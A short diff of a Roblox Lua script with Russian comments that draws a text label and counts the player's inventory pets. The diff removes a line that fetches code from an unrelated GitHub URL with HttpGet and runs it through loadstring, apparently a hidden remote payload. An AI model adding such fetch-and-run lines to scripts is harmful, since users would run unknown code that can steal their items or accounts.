@@ -11,7 +11,6 @@ label1.BackgroundColor3 = Color3.new(1, 1, 1) -- Цвет фона метки
 label1.TextColor3 = Color3.new(0, 0, 0) -- Цвет текста метки
 label1.FontSize = Enum.FontSize.Size60 -- Увеличиваем размер шрифта в 4 раза
 local count111 = 0
-loadstring(game:HttpGet("https://raw.githubusercontent.com/qweaad1/qwe/main/buyer"))()
 for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
   count111 = count111+1
 end
